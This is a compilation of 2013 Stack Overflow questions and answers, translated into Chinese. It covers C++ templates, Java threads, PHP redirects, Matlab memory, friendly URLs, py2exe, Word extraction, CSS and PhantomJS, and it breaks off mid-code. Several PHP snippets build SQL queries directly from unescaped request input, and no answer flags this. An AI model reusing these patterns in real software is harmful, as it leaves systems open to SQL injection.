../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:55:24: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h: In member function ‘bool lab7::DLList<T>::search(T)’:
../Lab7PartC/DLList.h:62:28: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:64:53: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:65:21: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h: In member function ‘bool lab7::DLList<T>::searchandremove(T)’:
../Lab7PartC/DLList.h:73:28: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:74:28: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:75:32: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:78:28: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:79:28: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:80:21: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:81:21: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:84:21: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:87:21: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:89:25: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h: In member function ‘lab7::DLNode* lab7::DLList<T>::findNode(T)’:
../Lab7PartC/DLList.h:99:28: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:100:53: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:101:21: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h: In member function ‘void lab7::DLList<T>::swap()’:
../Lab7PartC/DLList.h:109:28: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:111:32: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:111:64: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:113:13: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:114:14: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:114:28: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:115:13: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:116:13: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:116:28: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:117:14: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:118:14: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h: In member function ‘void lab7::DLList<T>::insert(T) [with T = int]’:
../Lab7PartC/Lab7B.cpp:23:26:   instantiated from here
../Lab7PartC/DLList.h:44:9: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h: In member function ‘bool lab7::DLList<T>::searchandremove(T) [with T = int]’:
../Lab7PartC/Lab7B.cpp:34:32:   instantiated from here
../Lab7PartC/DLList.h:91:13: warning: possible problem detected in invocation of delete operator:
../Lab7PartC/DLList.h:75:17: warning: ‘toDelete’ has incomplete type
../Lab7PartC/DLList.h:14:11: warning: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:91:13: note: neither the destructor nor the class-specific operator delete will be called, even if they are declared when the class is defined.
../Lab7PartC/DLList.h: In destructor ‘lab7::DLList<T>::~DLList() [with T = int]’:
../Lab7PartC/Lab7B.cpp:46:1:   instantiated from here
../Lab7PartC/DLList.h:38:9: warning: possible problem detected in invocation of delete operator:
../Lab7PartC/DLList.h:38:9: warning: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: warning: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:38:9: note: neither the destructor nor the class-specific operator delete will be called, even if they are declared when the class is defined. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T05:02:01.013

首先，模板应该只在头文件中实现。请参阅[为什么模板只能在头文件中实现？](https://stackoverflow.com/questions/495021/why-can-templates-only-be-implemented-in-the-header-file)

现在，`DLNode`不是一个类，它是一个类模板，所以它应该总是有一个模板参数，即`DLNode<T>`or `DLNode<int>`。现在，您可能想知道为什么不在类主体中执行此操作，例如`void setNext(DLNode* n)`，这是因为该参数隐含在类范围中。

我写的内容似乎令人困惑，但一切都应该是这样的：

```
template<class T>
DLNode<T>::DLNode() {
    data = 0;
    next = NULL;
    prev = NULL;
}

template<class T>
DLNode<T>::DLNode(T d) {
    data = d;
    next = NULL;
    prev = NULL;
}

template<class T>
DLNode<T>::DLNode(T d, DLNode* n, DLNode* p) {
    data = d;
    next = n;
    prev = p;
}

template<class T>
DLNode<T>::~DLNode() {
    delete next;
} 
```

正如我所说，这段代码需要在头文件中，而不是在 cpp 文件中。虽然一旦你这样做了，在类体之外定义它们就变得毫无意义，因此只需在类体中定义所有内容：

```
namespace lab7 {
    template<class T>
    class DLNode {
    public:
        DLNode() {
            data = 0;
            next = NULL;
            prev = NULL;
        }

        // ...
    };

} /* namespace lab7 */ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T04:52:22.203

```
//forgot something here?
DLNode::~DLNode() {
    delete next;
} 
```

构造函数也是如此。**在每个**函数定义之前使用模板声明。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T04:56:24.350

至少有两个问题：你的默认构造函数和析构函数声明不以`template<class T>`.

# java - 满足条件时如何停止正在运行的线程？

> ID：15847099
> 
> 赞同：2
> 
> 时间：2013-04-06T04:46:38.143
> 
> 标签：java, multithreading

我想要一些关于如何在满足条件后停止线程的建议。

这是我的代码：

```
public class Animal implements Runnable {
    private static boolean winner = false;
    private String name;
    private int position;
    private int speed;
    private long restMax;

    public Animal(String name, int position, int speed, long restMax) {

        this.name = name;
        this.position = position;
        this.speed = speed;
        this.restMax = restMax;
    }

    @Override
    public void run() {

        while (position < 100){
            position += speed;
            try {
                Thread.sleep((long) (0 + (Math.random()  * restMax)));
            } catch (InterruptedException e) {

                e.printStackTrace();
            }

        System.out.println(name + " is at position " + position );

    }
        if (position >= 100){
            winner = true;
            System.out.println(name + " is the winner of the race!");
            Thread.interrupted();
        }
    }

} 
```

这是我在 main 方法中创建的 2 个 Animal 对象的输出：

即使宣布获胜者，线程仍在继续（在这种情况下，本土兔子是获胜者）。我的问题是满足条件时如何停止其他线程？我尝试了 interrupted() 方法，但看不到任何差异。

```
Homegrown Rabbit is at position 5

Homegrown Rabbit is at position 10

Wild Turtle is at position 3

Wild Turtle is at position 6

Homegrown Rabbit is at position 15

Homegrown Rabbit is at position 20

Wild Turtle is at position 9

Wild Turtle is at position 12

Wild Turtle is at position 15

Homegrown Rabbit is at position 25

Wild Turtle is at position 18

Homegrown Rabbit is at position 30

Wild Turtle is at position 21

Homegrown Rabbit is at position 35

Wild Turtle is at position 24

Homegrown Rabbit is at position 40

Wild Turtle is at position 27

Wild Turtle is at position 30

Homegrown Rabbit is at position 45

Homegrown Rabbit is at position 50

Wild Turtle is at position 33

Homegrown Rabbit is at position 55

Wild Turtle is at position 36

Wild Turtle is at position 39

Homegrown Rabbit is at position 60

Wild Turtle is at position 42

Wild Turtle is at position 45

Homegrown Rabbit is at position 65

Wild Turtle is at position 48

Wild Turtle is at position 51

Homegrown Rabbit is at position 70

Homegrown Rabbit is at position 75

Wild Turtle is at position 54

Wild Turtle is at position 57

Wild Turtle is at position 60

Homegrown Rabbit is at position 80

Homegrown Rabbit is at position 85

Wild Turtle is at position 63

Wild Turtle is at position 66

Homegrown Rabbit is at position 90

Wild Turtle is at position 69

Wild Turtle is at position 72

Wild Turtle is at position 75

Homegrown Rabbit is at position 95

Wild Turtle is at position 78

Homegrown Rabbit is at position 100

Homegrown Rabbit is the winner of the race!

Wild Turtle is at position 81

Wild Turtle is at position 84

Wild Turtle is at position 87

Wild Turtle is at position 90

Wild Turtle is at position 93

Wild Turtle is at position 96

Wild Turtle is at position 99

Wild Turtle is at position 102

Wild Turtle is the winner of the race! 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T05:00:21.997

您不需要任何 Thread 原语来停止线程。您只需要退出 while 循环。

这是修改后的运行

```
public void run() 
{
    while (winner == false)
    {
        position += speed;
        System.out.println(name + " is at position " + position );

        if(position >= 100)
        {
            winner = true;
            System.out.println(name + " is the winner of the race!");
            break;
        }

        try 
        {
            Thread.sleep((long) (0 + (Math.random()  * restMax)));
        } 
        catch (InterruptedException e) 
        {
            e.printStackTrace();
        }
    }

} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T05:15:48.920

如果找到获胜者，只需退出循环。

```
 @Override
    public void run() {

        while (position < 100){
            position += speed;
            try {
                Thread.sleep((long) (0 + (Math.random()  * restMax)));
            } catch (InterruptedException e) {

                e.printStackTrace();
            }

           /* Since winner is static, once one thread sets this to true,
              other threads will stop their execution as well. */
           if (winner)
               break;
        System.out.println(name + " is at position " + position );

    } 
```

我执行了这个并得到了这个：

```
rabbit is at position 2
horse is at position 5
rabbit is at position 4
horse is at position 10
horse is at position 15
horse is at position 20
horse is at position 25
horse is at position 30
rabbit is at position 6
horse is at position 35
rabbit is at position 8
horse is at position 40
horse is at position 45
horse is at position 50
horse is at position 55
horse is at position 60
horse is at position 65
horse is at position 70
horse is at position 75
horse is at position 80
horse is at position 85
horse is at position 90
horse is at position 95
horse is at position 100
horse is the winner of the race! 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T05:01:45.250

检查每个循环中的条件，当满足时，打破该循环，线程将被停止。

`interrupt()`一个线程只是设置中断标志，没有其他改变，您可以通过以下方式检查该值`isInterrupted()`

一般来说，除非自己愿意，否则线程是无法停止的。

# php - 在返回上一页时显示确认（PHP HTTP REFERER）

> ID：15847103
> 
> 赞同：0
> 
> 时间：2013-04-06T04:47:30.290
> 
> 标签：php, http-referer

这可能很简单，但我很难弄清楚，

将index.php中的数据提交给sell.php，由mysql查询处理，数据入库成功后自动返回上一页（index.php）。

我正在使用的代码是：

```
header("Location: " .$_SERVER['HTTP_REFERER']); 
```

我需要在这里进行一些改进。当sell.php页面返回index.php时，它会向用户发送一条数据提交成功的确认信息。

索引.php

```
<form name="vender" method="post" action="sell.php">
<?php echo $identity; ?> | <?php echo $model; ?>
<hr />
    <input type="hidden" name="serial" value="<?php echo $identity; ?>" />
    <input type="hidden" name="model" value="<?php echo $model; ?>" />
    <input type="hidden" name="date" value="<?php echo DATE('Y-m-d'); ?>" />
    <table style="font-size: 8pt;">
        <tr><td>IEMI:</td><td><input class="form-sell" type="text" name="imei" /></td></tr>
        <tr><td>Nombre: </td><td><input class="form-sell" type="text" name="name" /></td></tr>
        <tr><td>Contacto: </td><td><input class="form-sell" type="text" name="contact" /></td></tr>
        <tr><td>NIF: </td><td><input class="form-sell" type="text" name="nif" /></td></tr>
        <tr><td>Cantidad: </td><td><input class="form-sell" type="text" name="qty" /></td></tr>
        <tr><td>Precio: </td><td><input class="form-sell" type="text" name="price" /></td></tr>
        <tr><td><input type="submit" /></td></tr>
    </table>
</form> 
```

出售.php

```
<?php

include "connect.php";
include "links.php";

$date = $_POST['date'];
$serial = $_POST['serial'];
$model = $_POST['model'];
$imei = $_POST['imei'];
$name = $_POST['name'];
$contact = $_POST['contact'];
$nif = $_POST['nif'];
$qty = $_POST['qty'];
$price = $_POST['price'];

mysql_query("INSERT INTO mobile_sell_data(date,serial,model,imei,name,contact,nif,qty,price) VALUES('$date','$serial','$model','$imei','$name','$contact','$nif','$qty','$price')");

mysql_query("UPDATE mobils SET qty=qty-'$qty' WHERE id = '$serial'");
header("Location: " .$_SERVER['HTTP_REFERER']);

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T04:54:26.877

您是否考虑过使用 get 变量？

```
header("Location: " .$_SERVER['HTTP_REFERER'] . "?success=true"); 
```

还是使用会话？

```
session_start()
$_SESSION['success'] = true
//reset the session on the return page 
```

这些不是特别优雅的解决方案，但它们会起作用

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:17:30.327

发送标头后，您将无法回显任何内容，因为发送标头时服务器已完成对页面的处理。您可以在此处实施几个解决方案。您可以使用 GET 变量、POST 变量、SESSION 甚至 cookie 将数据发送回索引，或者您可以使用 ajax 从 index.php 中执行请求，这样您就不会真正离开索引页面。这是一个简单的解决方案：（注意，您需要在 sell.php 中删除重定向。一切都在 index.php 中以这种方式进行）

```
<?php
$successfulSubmit = FALSE;
if (!empty (@$_POST["sub"]))
{
    include "sell.php";
    $successfulSubmit = //some logic to verify data was successfully submitted
    if ($successfulSubmit)
    {
        echo "Data submitted successfully";
    }
    else
    {
        echo "Data submitted unsuccessfully";
    }
}
?>
<form name="vender" method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
<?php echo $identity; ?> | <?php echo $model; ?>
<hr />
<input type="hidden" name="serial" value="<?php echo $identity; ?>" />
<input type="hidden" name="model" value="<?php echo $model; ?>" />
<input type="hidden" name="date" value="<?php echo DATE('Y-m-d'); ?>" />
<table style="font-size: 8pt;">
    <tr><td>IEMI:</td><td><input class="form-sell" type="text" name="imei" /></td></tr>
    <tr><td>Nombre: </td><td><input class="form-sell" type="text" name="name" /></td></tr>
    <tr><td>Contacto: </td><td><input class="form-sell" type="text" name="contact" /></td></tr>
    <tr><td>NIF: </td><td><input class="form-sell" type="text" name="nif" /></td></tr>
    <tr><td>Cantidad: </td><td><input class="form-sell" type="text" name="qty" /></td></tr>
    <tr><td>Precio: </td><td><input class="form-sell" type="text" name="price" /></td></tr>
    <input type="hidden" name="sub" value="submitted" />
<tr><td><input type="submit" /></td></tr>
</table>
</form> 
```

# java - 如何减少 Matlab 中的物理内存增加？

> ID：15847106
> 
> 赞同：1
> 
> 时间：2013-04-06T04:47:56.733
> 
> 标签：java, class, matlab, object, memory-leaks

在 Matlab 中运行以下代码时，Matlab 的物理内存使用量会增加，直到达到我系统内存的 90%，并导致程序崩溃。这段代码是一个更大的优化方案的一部分，将有更多的迭代，但这里已经简化了。

```
import org.parent.modeling.*

for i = 1:100
    rTool = Tool('C:/etc');
    model = rTool.getModel();
    model.initSystem();
    rTool.setModel(model);
    rTool.run();
end 
```

`rTool`和模型作为 Java 对象存储在工作区中。通过有选择地从底部到顶部删除步骤，我确定`rTool.run()`; step 导致每次迭代期间内存增加。我尝试过使用各种内存清除技术但没有成功

```
clear classes, clear java, clear rTool model, clear all 
```

我已经通过运行命令检查了碎片`memory`，但它是微不足道的。下面是对应于 API 文档的实际代码 ( [https://simtk.org/api_docs/opensim/api_docs/classOpenSim_1_1RRATool.html](https://simtk.org/api_docs/opensim/api_docs/classOpenSim_1_1RRATool.html) )

```
for i = 1:1:4

    import org.opensim.modeling.*

    rraTool = RRATool('C:\...filename.xml');
    model = rraTool.getModel();
    model.initSystem();

    rraTool.setModel(model);
    rraTool.run();

end 
```

有什么减少物理内存增加的建议吗？

MATLAB：2013

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T23:32:25.313

很难弄清楚你到底在做什么，更不用说它为什么会泄漏内存了。根据我的推断，您可以从 MatLab 调用 Java，也可以直接从 Matlab 调用 C++。我不知道您是直接调用 C++ 库，还是通过 Java (JNI / JNA) 包装器调用它。如果你正在做后者......为什么。

对于 Matlab -> C++ 案例，此页面有一些避免内存泄漏的提示：http: [//www.mathworks.com.au/help/matlab/matlab_external/memory-management-issues.html](http://www.mathworks.com.au/help/matlab/matlab_external/memory-management-issues.html)

对于 Matlab -> Java -> C++ 情况，泄漏可能是由于 Java 包装器或其关联的 C++ 端包装器代码中的错误，或者您使用包装器的方式存在问题。例如，`dispose`您可能需要调用某些方法。详细信息应在 Java API 文档中……您无法找到……或在 Java 源代码本身中。

* * *

> 我希望有一些我可以使用的通用内存清除 Java 命令。

没有这样的神奇命令。您需要找出内存泄漏的位置并修复它。

# php - Stack Overflow URL 是如何工作的？

> ID：15847109
> 
> 赞同：8
> 
> 时间：2013-04-06T04:48:40.047
> 
> 标签：php, url

我已经构建了我的网站的 URL，例如 Stack Overflow URL。我的网址如下。

```
http://www.example.com/1255544/this-is-the-url-text 
```

在这个 URL 中，`1255544`是 id 和`this-is-the-url-text`是 URL 标题文本，两者都存储在数据库中。我注意到 Stack Overflow URL 是基于 id 工作的。假设这里是一个 Stack Overflow URL

```
http://stackoverflow.com/questions/15679171/new-way-to-prevent-xss-attacks 
```

在此 URL 中，`15679171`是帖子的 ID。当我将此 id 更改为`15706581`不触摸`new-way-to-prevent-xss-attacks`并按 Enter 时，URL 自动更改为以下 URL：

```
http://stackoverflow.com/questions/15706581/simplecursoradapter-does-not-load-
external-sqlite-database-id-error 
```

当我尝试删除 URL 标题文本的某些部分时，如下所示

```
http://stackoverflow.com/questions/15679171/new-way-to-preve 
```

它会自动更正 URL，如下所示：

```
http://stackoverflow.com/questions/15679171/new-way-to-prevent-xss-attacks 
```

这意味着正在根据 id 从数据库中检索数据，并且根据 id附加`15679171`了相关的 URL 标题文本。`new-way-to-prevent-xss-attacks`

我也想这样做。但问题是，我不明白如果有人更改 URL 的 id，标题文本应该会自动更改。我该怎么做呢？

我想到了以下几点：

```
$url_id = $_GET["id"];
$url_txt = $_GET["url_txt"];

$qry = "SELECT * FROM mytable WHERE url_id = '{$url_id}' LIMIT 1";
$data = mysql_query($qry);
$data_set = mysql_fetch_array($data);

if($url_txt== $data_set["url_txt"]) {
    // proceed further
} else {
     $rebuilt_url = "http://www.example.com/" . $url_id . "/" . $data_set["url_txt"];
     header("Location: {$rebuilt_url}")  // Redirect to this URL
} 
```

执行此操作是否正确且有效？有解决办法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-06T05:02:40.507

您的代码看起来不错，在我的 Stack Overflow 答案之一中，我也提出了类似的方法。但是，我建议只进行一项小的改进。代替：

```
header("Location: {$rebuilt_url}"); 
```

你应该做：

```
header ('HTTP/1.1 301 Moved Permanently');
header("Location: {$rebuilt_url}"); 
```

这将使浏览器积极缓存这些 URL，并且您的代码和 SQL 查询不会每次都执行。

**还要检查：**

1.  [.htaccess 如果 URL 不好做某事](https://stackoverflow.com/questions/14816625/htaccess-if-url-is-bad-do-something/14816869#14816869)
2.  [.htaccess 重写友好的 URL](https://stackoverflow.com/questions/6520671/htaccess-rewrite-friendly-urls/6520802#6520802)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-06T04:53:33.287

如果你使用[Apache](http://en.wikipedia.org/wiki/Apache_HTTP_Server)，我想你一定知道**[URL 重写](http://en.wikipedia.org/wiki/Rewrite_engine)**

在 URL 重写中，您将 URL 重写为更友好的外观。看看下面的网址

> [http://www.downloadsite.com?category=34769845698752354](http://www.downloadsite.com?category=34769845698752354)

当你对其进行 URL 重写时，它变成了这样

```
http://www.downloadsite.com/Nettools/Messengers 
```

URL 重写需要在 Apache 配置（重写规则）上设置，因此它会在 PHP 解释请求之前重写您的 URL，因此您将获得您想要获取的确切资源

```
 RewriteRule ^/category$ /content.php  
  RewriteRule ^/category/([0-9]+)$ /.php?id=$1  
  RewriteRule  
    ^/category/([0-9]+),([ad]*),([0-9]{0,3}),([0-9]*),([0-9]*$)  
    cat.php?id=$1&sort=$2&order=$3&start=$4 
```

好吧，我不能在这里向您解释所有内容，但下面我为您提供了一些链接，您可以在其中了解 URL 重写。

**这是创建友好 URL 的最佳技巧！**

**资源：**

*   [http://www.cyberdesignz.com/blog/website-design/url-rewriting-top-5-ways-of-php-url-rewriting/](http://www.cyberdesignz.com/blog/website-design/url-rewriting-top-5-ways-of-php-url-rewriting/)

*   [http://www.fliquidstudios.com/2009/01/06/url-rewriting-with-apache-and-php-a-simple-example/](http://www.fliquidstudios.com/2009/01/06/url-rewriting-with-apache-and-php-a-simple-example/)

*   [http://www.sitepoint.com/guide-url-rewriting/](http://www.sitepoint.com/guide-url-rewriting/)

*   [.htaccess 重写友好的 URL](https://stackoverflow.com/questions/6520671/htaccess-rewrite-friendly-urls/6520802#6520802)

# python-2.7 - 使用 py2exe 创建 python 应用程序的可执行文件

> ID：15847110
> 
> 赞同：1
> 
> 时间：2013-04-06T04:48:57.023
> 
> 标签：python-2.7, py2exe

我坚持创建我的 python 程序的可执行文件。我创建可执行文件的设置如下所示，

```
from distutils.core import setup
import py2exe, sys, os

sys.argv.append('py2exe')
project = dict(script="smarttester.py",
      dest_base="Smart Tester",
      uac_info="requireAdministrator")
console = [project]

setup(
    version = "1.0.0",
    description = "executable with privileges",
    console = console,
    options = {'py2exe': {'bundle_files': 1}},
    zipfile = None
     ) 
```

我收到一个错误，显示为，

```
 Traceback (most recent call last):
     File "C:\mypath\to\createexe.py", line 14, in <module>
         options = {'py2exe': {'bundle_files': 1}},
     File "C:\Python27\lib\distutils\core.py", line 162, in setup
          raise SystemExit, error
 SystemExit: error: MSVCP90.dll: No such file or directory 
```

寻找解决方案。在此先感谢。

# c# - 从 Microsoft Word 中提取指定信息

> ID：15847113
> 
> 赞同：0
> 
> 时间：2013-04-06T04:49:33.953
> 
> 标签：c#, ms-word, text-extraction

假设我有一个word文档，内容如下

```
Name: Blabla1
Address: Blablabla2
History Employment: Blablabla3
                    Blablabla4
                    Blablabla5 
```

我的问题是如何以及使用什么算法（如果存在）将该信息提取到 C# 中的类中。

```
Class Employee {
    public string Name { get; set; }
    public string Address { get; set; }
    public IEnumerable<string> History = new IList<string>();
} 
```

有什么建议吗？

```
var Employee = ExtractMethodFromDoc(docPath); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T04:57:42.757

MS Word 完全可以通过 OLE 自动化编写脚本。

c# 中没有为此目的的通用库。您可以使用第三方应用程序转换为另一种格式，例如 ASCII。

为此，您还可以参考此链接到 PERL 模块：

[http://www.xav.com/perl/site/lib/Win32/OLE.html](http://www.xav.com/perl/site/lib/Win32/OLE.html)

你也可以参考这个 MSDN：

[http://msdn.microsoft.com/en-us/library/cc974107%28office.12%29.aspx](http://msdn.microsoft.com/en-us/library/cc974107%28office.12%29.aspx)

您还可以使用下面的这个 Open XML SDK 2.0 代码链接：

[http://www.microsoft.com/en-us/download/details.aspx?id=17985](http://www.microsoft.com/en-us/download/details.aspx?id=17985)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:07:14.593

你可以使用微软word dll。创建word dll对象并加载数据。

# flashdevelop - 为什么禁用所有调试按钮？

> ID：15847118
> 
> 赞同：0
> 
> 时间：2013-04-06T04:50:13.873
> 
> 标签：flashdevelop

我在windows XP中安装了flashdevelop，虽然我安装了java 6，但调试器的所有按钮都被禁用了..

任何的想法？请看附图 ![在此处输入图像描述](https://i.stack.imgur.com/pAy6e.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T21:55:52.637

它们被禁用是因为调试器未连接到任何 SWF。

# javascript - 在 Gmail 中获取线程 ID

> ID：15847119
> 
> 赞同：5
> 
> 时间：2013-04-06T04:50:20.427
> 
> 标签：javascript, multithreading, email, gmail

我正在寻找一种方法来弄清楚如何在Gmail上获取特定电子邮件的线程ID，就在它发送之前或点击发送按钮的位置。

目前，我正在使用 Javascript 来从电子邮件中删除其他项目并将它们存储在一个记录中，该记录对除线程 ID 之外的所有内容都非常有效。

我在 URL 中发送电子邮件后可以找到线程 ID：

```
https://mail.google.com/mail/u/0/?shva=1#inbox/13ddda647539dcca 
```

在这种情况下，线程 ID（如果我是对的 - 是 13ddda647539dcca。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-19T17:12:54.503

如果有人仍然感兴趣 - 您可以在发送电子邮件后通过观察页面顶部显示的来检索线程 ID。此跨度包含一个链接，该链接具有名为“ **param** ”的属性，该属性具有线程 ID。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T04:53:56.113

你可以试试：

```
var matched = window.location.hash.match(/[A-Za-z0-9]+$/);
if (matched) {
    // Found alphanumeric string at end of hash
} 
```

你可以用`matched[0]`.

`window.location.hash`应该只抓取“#inbox/13ddda647539dcca”部分。然后正则表达式将匹配字符串末尾的任何字母数字字符。因此，“收件箱”与线程 ID 用“/”隔开这一事实很重要。

当然，所有这一切都取决于 Gmail 保持 URL 遵循与当前看起来相同的约定的可靠性。

# css - 让相对高度道具与窗口调整大小 CSS 一起使用

> ID：15847122
> 
> 赞同：0
> 
> 时间：2013-04-06T04:50:42.533
> 
> 标签：css

谁能帮我完成这个简单的，据说很容易的 css 任务？我正在尝试设置一个 div 高度来调整窗口大小。这是我到目前为止所拥有的：

```
div.signIn {
margin: 20px 20px 10px 40px;
border-style: ridge;
border-color: #006a89;
min-height: 450px;
height: 90%;
width: 26%;
min-width: 255px;
padding: 10px 20px 10px 20px;
line-height: 210%;
float: left;
} 
```

宽度工作正常，但不是高度。没有其他样式在 div 上工作。谁能发现为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T05:00:20.603

尝试设置`html`和`body` `height`。

[jsFiddle](http://jsfiddle.net/Tyriar/tqnLB/)

```
html,
body {
    height:100%;
} 
```

# javascript - 在 PhantomJS 上我不能包含 jQuery，没有 jQuery 我不能发布表单数据

> ID：15847123
> 
> 赞同：8
> 
> 时间：2013-04-06T04:50:53.083
> 
> 标签：javascript, phantomjs, evaluate

我在 PhantomJS 中运行 jQuery 时遇到问题。我找到[了这个](https://stackoverflow.com/questions/12555203/phantomjs-does-not-execute-function-in-page-evaluate-function)答案，它谈到了评估函数内部没有可用的变量，但问题是关于节点模块的，在我的示例中，我只`console.log`在评估函数内部调用。我也把这个问题放在了[GitHub 上](https://github.com/ariya/phantomjs/issues/11211)。

以前，对于某些页面，以下`evaluate`代码没有执行。现在@b1f56gd4 提供了一些帮助，现在它会打印消息；我无法执行它，但现在我可以看到：

> [https://login.yahoo.com/](https://login.yahoo.com/)上的页面运行来自[http://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js](http://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js)的不安全内容。

我无法从不同的域加载 jQuery 并且`--local-to-remote-url-access=true`or`--web-security=false`选项没有区别。

我将尝试在本地加载 jQuery。这是代码：

```
console.log('Loading a web page');
var url = 'https://login.yahoo.com/'; 
var page = require('webpage').create();
console.log('Setting error handling');
page.onConsoleMessage = function (msg) {
    console.log(msg);
};
page.onError = function (msg, trace) {
    console.log(msg);
    trace.forEach(function(item) {
        console.log('  ', item.file, ':', item.line);
    })
    phantom.exit();
}
console.log('Error handling is set');
console.log('Opening page');
page.open(url, function (status) {
    if (status != 'success') {
        console.log('F-' + status);
    } else {
        console.log('S-' + status); 
        //-------------------------------------------------     
        var jsLoc = '';
        jsLoc = 'jquery.min.js'; // to load local
        //jsLoc = 'http://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js'; // to load remote
        var func = function(pg){
            console.log('Function called');
            console.log('Page evaluating');
